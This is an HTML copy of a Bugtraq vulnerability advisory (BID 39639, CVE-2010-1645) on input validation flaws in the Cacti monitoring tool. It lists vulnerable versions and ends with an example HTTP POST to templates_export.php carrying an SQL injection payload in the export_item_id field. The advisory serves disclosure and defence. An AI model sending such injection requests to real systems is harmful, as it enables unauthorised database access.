@@ -1,0 +1,210 @@
+#SpeeDr00t@Black Falcon<br>#bid39639<p><b><span style="font-size: 18pt;">Cacti Multiple Input Validation Security Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/39639/info">info</a><br><a href="http://www.securityfocus.com/bid/39639/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/39639/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/39639/solution">solution</a><br><a href="http://www.securityfocus.com/bid/39639/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				39639
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2010-1645<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Apr 22 2010 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jan 22 2014 08:32AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				&amp;amp;lt;br&amp;amp;gt;Nahuel Grisolia
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					RedHat HPC Solution EL5  5<br/>
+					
+				
+					Planet Technology WSW-2401 0.8.6 h<br/>
+					
+				
+					Planet Technology WSW-2401 0.8.6 g<br/>
+					
+				
+					MandrakeSoft Enterprise Server  5 x86_64<br/>
+					
+				
+					MandrakeSoft Enterprise Server  5<br/>
+					
+				
+					MandrakeSoft Corporate Server 4.0 x86_64<br/>
+					
+				
+					MandrakeSoft Corporate Server  4.0<br/>
+					
+				
+					Gentoo Linux  <br/>
+					
+				
+					Debian Linux  6.0 sparc<br/>
+					
+				
+					Debian Linux  6.0 s/390<br/>
+					
+				
+					Debian Linux  6.0 powerpc<br/>
+					
+				
+					Debian Linux  6.0 mips<br/>
+					
+				
+					Debian Linux  6.0 ia-64<br/>
+					
+				
+					Debian Linux  6.0 ia-32<br/>
+					
+				
+					Debian Linux  6.0 arm<br/>
+					
+				
+					Debian Linux  6.0 amd64<br/>
+					
+				
+					Cacti Cacti 0.8.7 <br/>
+					
+				
+					Cacti Cacti 0.8.6 f<br/>
+					
+				
+					Cacti Cacti 0.8.6 c<br/>
+					
+				
+					Cacti Cacti 0.8.5 a<br/>
+					
+				
+					Cacti Cacti 0.8.5 <br/>
+					
+				
+					Cacti Cacti 0.8.4 <br/>
+					
+				
+					Cacti Cacti 0.8.3 a<br/>
+					
+				
+					Cacti Cacti 0.8.3 <br/>
+					
+				
+					Cacti Cacti 0.8.2 a<br/>
+					
+				
+					Cacti Cacti 0.8.2 <br/>
+					
+				
+					Cacti Cacti 0.8.1 <br/>
+					
+				
+					Cacti Cacti 0.8 <br/>
+					
+				
+					Cacti Cacti 0.6.7 <br/>
+					
+				
+					Cacti Cacti  0.8.7f<br/>
+					
+				
+					Cacti Cacti  0.8.7e<br/>
+					
+				
+					Cacti Cacti  0.8.7d<br/>
+					
+				
+					Cacti Cacti  0.8.7c<br/>
+					
+				
+					Cacti Cacti  0.8.7b<br/>
+					
+				
+					Cacti Cacti  0.8.7a<br/>
+					
+				
+					Cacti Cacti  0.8.6k<br/>
+					
+				
+					Cacti Cacti  0.8.6j<br/>
+					
+				
+					Cacti Cacti  0.8.6i<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Cacti Cacti  0.8.7g<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit these issues via a browser. <br/><br/>The following example data is available:<br/><br/>POST /cacti-0.8.7e/templates_export.php HTTP/1.1<br/>Host: www.example.com<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br/>Accept-Language: en-us,en;q=0.5<br/>Accept-Encoding: gzip,deflate<br/>Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7<br/>Keep-Alive: 300<br/>Proxy-Connection: keep-alive<br/>Referer: http://www.example.com/cacti-0.8.7e/templates_export.php<br/>Cookie: clickedFolder=tree_1%5Etree_1_leaf_7%5E; highlightedTreeviewLink=tree_1_leaf_7; <br/>    Cacti=563bb99868dfa24cc70982bf80c5c03e<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 130<br/><br/>export_item_id=18 and 1=1&amp;amp;include_deps=on&amp;amp;output_format=3&amp;amp;export_type=graph_template&amp;amp;<br/>save_component_export=1&amp;amp;action=save&amp;amp;x=24&amp;amp;y=12
+	
+		<ul>
+</ul>
+</div>
